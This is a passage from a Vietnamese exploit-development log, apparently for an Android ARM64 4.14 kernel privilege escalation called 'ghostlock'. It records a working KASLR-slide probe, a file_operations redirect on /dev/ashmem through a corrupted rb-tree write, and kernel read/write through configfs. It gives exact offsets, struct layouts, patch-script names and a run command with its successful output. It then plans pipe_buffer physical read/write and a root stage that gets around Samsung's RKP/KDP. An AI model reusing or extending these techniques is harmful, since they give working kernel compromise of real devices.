1. Log phải **fsync** (đã có ở khối startup + sau `prepare_perf_fake_page` + trong route);
   nếu không, panic/kill ⇒ `gl.log` = **0 byte**.
2. Chạy **tách rời**: `nohup sh -c '… > gl.log 2>&1' &` để adb không đứt giữa lệnh.
3. Đọc dump: chờ **2–3 phút** sau reboot, `zcat` **không** được (là **ZIP**) ⇒ dùng
   `kp_scan.py <dump>`; tra theo **tên tiến trình**; `Unable to handle` = Oops,
   `Call trace` + `sec_debug_pm_restart` = panic/hang.
4. `ONLY_FOPS=1` khi chỉ cần kiểm chứng mode-4 ⇒ **không tốn reboot**.
5. Kiểm `ls -la gl.log` (mtime phải đổi) và `uptime` trước khi tin một run.

*Ghi 2026-10-10 (phiên 2, chốt). Xem `PROMPT_PHIEN_3.md` (cùng thư mục) để bàn giao.*

---

## 22. PHIÊN 3 — PHÁ TRẦN (A): FOPS REDIRECT CHẠY THẬT + ĐỌC/GHI KERNEL QUA CONFIGFS (2026-10-10)

> Trạng thái: **`cfi write ret=<len>` + `cfi fops_before == fake_fops`** đạt được, máy **không reboot**.
> Đây là cột mốc (A) mà §19–§21 đặt ra. Dưới đây là mọi thứ đã CHỐT (suy từ disasm/source, không đoán).

### 22.1 KASLR slide — MÔ HÌNH ĐÚNG
- **`slide = ("Kernel Offset") + 0x80000`**; alignment = **0x8000** (KHÔNG phải 0x10000/2MB).
  - `Image` header: `text_offset = 0x80000`, magic `ARMd`.
  - `kallsyms_fixed.txt` = **file offset trong Image** (kiểm bằng byte-pattern `rb_erase_cached`).
  - Kiểm 20+ panic + boot thật: luôn `slide(PC-derived) − Kernel Offset = 0x80000` (ví dụ dump85:
    `Kernel Offset: 0x18000` ⇒ slide `0x98000` = đúng giá trị probe cùng boot).
- **Lấy slide runtime (0 rủi ro):** `slideprobe` (perf SW cpu-clock `SAMPLE_IP`) trong vòng `pread` memfd;
  IP trội → hot-loop `__arch_copy_to_user+0x1a0`; IP thấp kế → `el0_svc_naked+0x8` (hàm tí hon, ghim slide
  trong cửa sổ ~0x20 ⇒ duy nhất 1 bội 0x8000). `slide = IP_el0svc − KIMAGE − 0x3bd4`
  (= `IP_copy − KIMAGE − 0x16d9c20`). Slide **đổi mỗi boot**.
- Inject: `SLIDE=0x…` (patch `patch_slide_env.py`) ⇒ `kaslr_base = KIMAGE_TEXT_BASE + slide`,
  `kaslr_done=1`, đặt TRƯỚC `prepare_skb_payload()`. Không dùng `slide_leak_kernel_base()` (vòng tròn).

### 22.2 Target mode-4 = **canonical** (KHÔNG dùng `data_addr`)
- `data_addr()` (linear alias) cần `delta = phys_load − memstart`; `memstart` bị dịch ngẫu nhiên
  (`arch/arm64/mm/init.c:556`) ⇒ `delta` không đoán được. Thử `0` và `0x80000` đều trượt (`cfi write=-1 errno=22`).
- `canon_addr(x) = kaslr_base + (x − KIMAGE_TEXT_BASE)` **đúng** (một khi có slide) và cùng trang vật lý
  (`.data` RW). Ghi vào `canon_addr(ASHMEM_MISC_FOPS)` là đủ (patch `patch_slide_canon*.py`).
- `misc_open()` đọc `c->fops` lúc open (source `drivers/char/misc.c`).

### 22.3 Giá trị walk ghi = `(page+0x318)|1` ⇒ đặt bảng fops ở `page+0x319`
- `rb_erase_cached` case 1 (disasm +0x168): `*(node->rb_right) = node->__rb_parent_color`; node = `&fake_w0->pi_tree`
  = `page+0x318`; và walk sắp xếp lại `W0.pi_tree` trước erase ⇒ giá trị ghi ra = **`(page+0x318)|1` = `page+0x319`**,
  KHÔNG phải `write_pc` (xác nhận bằng `WRITE4_SCRATCH`: `page[0x3c0]=page+0x319` vs `want=fake_fops`).
- ⇒ **`fake_fops = payload_base + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 1` (= `base+0x319`)**; bảng fops thật
  được ghi lại trong **repair** (sau walk, trước CFI) vì walk đã phá vùng `page+0x319`.
  `write_pc` giữ = dummy `payload_base + FOPS_TABLE_OFF` (page+0x100). `binwrite_target` dời ra `base+0x800`
  (ngoài vùng bảng). (patch `patch_slide_canon2.py` + `_fops_at_write.py`.)

### 22.4 Fake fops: dùng `.read`/`.write` CŨ, không phải `_iter`
- `fs/configfs/file.c`: `configfs_{read,write}_bin_file(struct file *, buf, count, ppos)` là `.read`/`.write`
  (KHÔNG phải `_iter`). Nếu đặt chúng vào `FOPS_*_ITER_OFF` và để `.write=0` thì `__vfs_write` đi nhánh
  `write_iter(iocb)` ⇒ `file->private_data` đọc từ `iocb+0xd0` = rác (`0x46c92c`) ⇒ panic.
- **Fix:** `.read` = `configfs_read_file` (`0x002BE46C`), `.write` = `configfs_write_bin_file` (`0x002BE96C`),
  `read_iter/write_iter = 0`.
- **Read không cần `to_frag`:** `configfs_read_file` bỏ qua `to_frag(file)` nếu `needs_read_fill == 0`
  (disasm: `ldr w8,[x25,#72]; cbz w8, skip`). Vì `/dev/ashmem` không phải dentry configfs nên **bắt buộc**
  dùng `configfs_read_file` + `needs_read_fill=0` (không dùng `configfs_read_bin_file`).
- JOPP (`CONFIG_RKP_CFP_JOPP`): mọi `blr` kiểm magic `0x00be7bad` 4 byte trước hàm đích; **cả 9 hàm đích
  của fake fops đều có magic** ⇒ redirect hợp lệ.

### 22.5 Port `struct configfs_buffer` (đo từ disasm)
Layout thật của kernel này: `mutex@0x20, needs_read_fill@0x48, read_in_progress@0x4c,
write_in_progress@0x4d, bin_buffer@0x50, bin_buffer_size@0x58, cb_max_size@0x5c`.
⇒ `CFG_PAGE_OFF=0x10, CFG_NEEDS_READ_FILL_OFF=0x48, CFG_BIN_BUFFER_OFF=0x50,
CFG_BIN_BUFFER_SIZE_OFF=0x58, CFG_CB_MAX_SIZE_OFF=0x5c` (offsets cũ của exploit lệch +8).

### 22.6 Kết quả chạy (build `T9`, boot slide `0xc8000`)
```
ONLY_FOPS=1 SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_PEEK=1 SSOPT_HOLD=0 SSOPT_OWNER0=0 \
PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 SLIDE=0xc8000 CFI_STOP_VERIFY=1 ./ghostlockT9
cfi attempt=1 fd=7 path=/dev/ashmem… fake_fops=ffffffc12c505319 ioctl=ffffff800910bf9c open=ffffff800910c9bc
cfi write ret=35 errno=0
cfi read  ret=35 errno=0
cfi fops_before ret=8 value=ffffffc12c505319 want=ffffffc12c505319 errno=0
cfi STOP_VERIFY: fops_before == fake_fops; restored orig; stopping before physrw errno=0
ONLY_FOPS: stop after fops redirect  (máy KHÔNG reboot)
```
⇒ **`*(ashmem_misc.fops) = fake_fops`** và primitive configfs read/write kernel chạy (write/read 35 byte OK).

### 22.7 Còn lại / lưu ý
- **Walk flaky:** ~50% hard-lock (`rt_mutex_adjust_prio_chain+0x1dc`, RCU stall) dù cấu hình không đổi ⇒
  một run lỗi **không** kết luận được gì; chạy lại. `CFI_STOP_VERIFY=1` để dừng sau khi xác nhận redirect
  (không vào physrw; khôi phục fops gốc ⇒ không bỏ rơi `/dev/ashmem`).
- **(B) tiếp theo:** bỏ `ONLY_FOPS`/`CFI_STOP_VERIFY` ⇒ `try_cfi_stage()` đi tiếp `restore_slide_boot_id`
  → `leak_kernel_base` → physrw. **Phải port `PIPE_TMP_PAGE_OFF/BUFS_OFF/USER_OFF/SIZE`** cho 4.14
  (`tmp_page@0x68, bufs@0x80, user@0x88, sizeof≈0x90`) — xem §10.
- **RKP:** `CONFIG_UH_RKP=y, RKP_KDP=y, RKP_DMAP_PROT=y, RKP_CFP=y` — CFP=ROP (không chặn indirect call
  tới hàm thật); KDP bảo vệ cred/selinux ⇒ W1/W2 về sau có thể bị chặn (dùng UMH qua fake fops thay vì W1/W2).

### 22.8 File tạo trong phiên (E:\Library\Desktop\ghostlock\)
- `slideprobe.c/_a64` (probe slide), `ghostlockT1..T9_a64` (build bước cuối).
- Patch: `patch_slide_env.py`, `patch_slide_canon.py`, `patch_slide_canon2.py`,
  `patch_repair_fops_page.py`, `_port_cfg.py`, `_fix_rw.py`, `_fix_readfile.py`, và các `_*.py` phân tích.
- Snapshot pre-patch: WSL `/root/ghostlock/_snap_core/`.

*Ghi 2026-10-10 (phiên 3). Trần (A) đã phá: PI write/fops redirect + configfs read/write kernel chạy;
còn (B) physrw (port PIPE_*) và (C) W1/W2.*

### 22.9 PHIÊN 3 — TIẾN VÀO (B): CONFIGFS RW OK, PHYSRW CHƯA
- Chạy **không** `CFI_STOP_VERIFY` (giữ `ONLY_FOPS=1` ⇒ dừng sau `do_one_write`, tức sau cả CFI):
  CFI đi tiếp `restore_slide_boot_id` → `leak_kernel_base` → `install_child_root` (physrw).
- **`leak_kernel_base` — 2 fix nữa:**
  1. `kaslr_fops_alias` phải = `canon_addr(ASHMEM_FOPS)` khi có slide (không dùng `p0_data_alias`, delta chưa biết).
     Đọc ra: `open=ffffff800918c9bc ioctl=…bf9c mmap=…c84c rel=…ca3c` — đúng kernel-ptr.
  2. **Bỏ gate `show_fdinfo`**: kernel này `ashmem_fops.show_fdinfo == 0` (`off_ashmem_show_fdinfo=0`)
     ⇒ check `is_kernel_ptr(show_fdinfo)` làm `kaslr_step=1` (fail) dù mọi thứ đúng. (patch `_fix_showfdinfo.py`.)
- Sau đó `install_pipe_physrw` chạy nhưng **`physrw cache gate FAILED candidate=0 want=0`** (12 attempt)
  ⇒ `cfi FAIL step=8`, **máy reboot** (nghi forging `pipe_buffer` gây hỏng). ⇒ Đây là tường mới: **physrw
  slab-scan gate** chưa khớp máy này (`pipe_page_slab_cache[]`/`pipe_page_type[]`, hằng `KMALLOC_PIPE_*`,
  `STRUCT_PAGE_*`, `KMALLOC_CGROUP_PIPE_SLOT`, `anon_pipe_buf_ops`). Cần disasm/probe `kmalloc-cg-2k` +
  `struct page` trên 4.14.
- Ghi chú: `pipe.c` **không** được build (chỉ `pipe_physrw.c`); các `PIPE_TMP_PAGE_OFF/BUFS_OFF/USER_OFF`
  trong `target.h` là **di tích, không dùng**. `pipe_physrw.c` dùng `struct user_pipe_buffer`
  (khớp `pipe_buffer`: `ops@0x10, flags@0x18`) + `anon_pipe_buf_ops` (offset khớp kallsyms → OK).

*Ghi 2026-10-10 (phiên 3, phần B). Configfs RW + leak_kernel_base OK; còn tường physrw cache-gate.*

### 22.10 PHIÊN 3 — (B) TIẾP: 5 FIX PORT + TƯỜNG `page_base`
Các bug port nữa đã sửa (đều suy từ source/disasm):
1. **`DIRECT_MAP_END` = 0** (target.h) ⇒ `is_direct_ptr()` **luôn false** (dùng ở `pr_cache_gate`, `root.c`,
   `umh_root.c`) ⇒ mọi gate fail. Sửa = `0xffffffc400000000`.
2. **`refresh_fake_fops_text()`** (fops.c) còn ghi `.read = configfs_read_bin_file` ⇒ sau `leak_kernel_base`
   nó ghi đè bảng ⇒ read sau đó fault `configfs_read_bin_file+0x3c` (to_frag). Sửa `.read = configfs_read_file`.
3. **`pr_kmalloc_caches()`** dùng `data_addr` (linear alias, delta 0) ⇒ đọc rác → gate không khớp.
4. **`data_addr()`** (util.c) → **canonical khi có slide** (cùng trang vật lý, `.data` RW đã chứng minh);
   sửa luôn mọi chỗ `data_addr(...)` trong `root.c`/`umh_root.c`.
5. (trước đó) `.read`/`.write` đúng slot + `CFG_*` offsets.

Kết quả sau các fix: `leak_kernel_base` **PASS**; `pr_cache_gate` đọc được cache **thật**
(`normal_2k`, `cgroup_2k` là kmem_cache ptr hợp lệ). Nhưng gate vẫn FAIL vì **`candidate` (slab_cache của
trang trong vùng `page_base`) là một cache KHÁC**, không phải kmalloc-2k.

⇒ **Tường mới (B):** `page_base` hiện = **trang giả memfd** (`prepare_perf_fake_page`), KHÔNG phải một
vùng **kmalloc-2k slab**. `pipe_physrw.c` giả định `page_base` là "32KB slab region đã đọc/ghi được qua
configfs" (để forge `pipe_buffer` kmalloc-2k). Trong port này cần `page_base` = **một trang/region kmalloc-2k
slab** (leak bằng cách khác, ví dụ quét slab qua configfs hoặc KernelSnitch), hoặc sửa `pr_prepare/cache_gate`
cho khớp với nguồn leak hiện có. Đây là việc thiết kế tiếp (không còn là hằng số port).

*Ghi 2026-10-10 (phiên 3, phần B2). Configfs RW + leak_kernel_base PASS; tường = `page_base` phải là
kmalloc-2k slab cho physrw.*
